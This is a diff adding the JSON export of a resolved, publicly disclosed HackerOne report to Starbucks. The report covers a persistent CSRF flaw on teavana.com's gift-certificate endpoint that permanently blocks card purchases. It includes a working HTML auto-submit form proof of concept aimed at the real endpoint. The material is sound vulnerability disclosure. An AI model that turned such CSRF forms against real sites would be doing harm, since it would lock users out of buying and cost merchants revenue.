@@ -1,0 +1,120 @@
+{
+  "id": 206319,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDYzMTk=",
+  "url": "https://hackerone.com/reports/206319",
+  "title": "Persistent CSRF in /GiftCert-AddToBasket prevents purchases on eCommerce sites",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-02-14T11:44:45.802Z",
+  "submitted_at": "2017-02-14T11:44:45.802Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "inhibitor181",
+    "url": "/inhibitor181",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/iK9ytFYT28QM6G5xrCaphqnv/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1989,
+    "url": "https://hackerone.com/starbucks",
+    "handle": "starbucks",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Starbucks",
+      "twitter_handle": "Starbucks",
+      "website": "http://www.starbucks.com",
+      "about": "Premier purveyor of the finest coffee in the world, inspiring and nurturing the human spirit — one person, one cup and one neighborhood at a time."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-05-15T18:30:21.926Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-05-15T17:17:45.550Z",
+  "team_member_agreed_on_going_public_at": "2017-05-15T18:30:21.862Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "SUMMARY\n--------------\nHello, I have found an extremely interesting issue that can be used to permanently lock a user's possibility of ever buying anything from teavana.com by removing the credit card payment method.\n\nPOC\n---------\nCSRF snippet\n```\n<html>\n\t<head></head>\n\t<body>\n\t\t<form method=\"POST\" id=\"GiftCertificateForm\" action=\"http://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/GiftCert-AddToBasket\">\n\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_from\" type=\"text\" name=\"dwfrm_giftcert_purchase_from\" value=\"Test whatever\" maxlength=\"2147483647\">\n\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_recipient\" type=\"text\" name=\"dwfrm_giftcert_purchase_recipient\" value=\"Test whhhateever\" maxlength=\"2147483647\">\n\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_recipientEmail\" type=\"text\" name=\"dwfrm_giftcert_purchase_recipientEmail\" value=\"valid@iamvalid.com\" maxlength=\"2147483647\">\n\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_confirmRecipientEmail\" type=\"text\" name=\"dwfrm_giftcert_purchase_confirmRecipientEmail\" value=\"valid@iamvalid.com\" maxlength=\"2147483647\">\n\t\t\t<textarea class=\"textbox\" id=\"dwfrm_giftcert_purchase_message\" name=\"dwfrm_giftcert_purchase_message\" rows=\"5\" cols=\"50\">Bla bla</textarea>\n\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_amount\" type=\"text\" name=\"dwfrm_giftcert_purchase_amount\" value=\"100\" maxlength=\"2147483647\">\n\t\t\t<input type=\"submit\" value=\"Send\" />\n\t\t</form>\n\t</body>\n</html>\n```\n\nDESCRIPTION\n----------------\nSo, I just wanted to find demandware.store hidden links and in my search I stumbled across\n```\nhttp://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/GiftCert-Purchase\n```\nFrom here, one can add custom gift cards in cart with a value between 5 and 5000 euros (or something like that). I have noticed that this is not CSRF protected, but this was a minor issue. Well, it became a serious problem after I noticed that after adding that gift card in my card, I wasn't able to fully empty my cart anymore and the credit card option was simply not available anymore and I wasn't able to fulfill any orders. Logging out and in doesn't do anything. Deleting cart product doesn't do anything. And because I tested teavana for some time, I know for a fact that the items in cart stay in cart (even after weeks).\n\nSo, I have made a new account, added the CSRF POC in a script then tested the flow and it worked. I have made my account unable to buy anything by adding that gift card in cart.\n\nIMPACT\n----------------\nPermanently denying a user the possibility to fulfill with his account any orders is a very big issue (hence the High severity I personally find) and if someone launched an attack against you, you will lose customers and money (not to mention the potentially negative publicity)\n\nVideo POC attached.\n\n",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-06-14T17:17:45.596Z",
+  "allow_singular_disclosure_after": -280879709.99519193,
+  "singular_disclosure_allowed": true,
+  "vote_count": 22,
+  "voters": [
+    "bogdantc",
+    "tess",
+    "michiel",
+    "fizhimchik",
+    "spam404",
+    "flashdisk",
+    "apapedulimu",
+    "pr0f0x01",
+    "eveeez",
+    "neilx",
+    "and 12 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
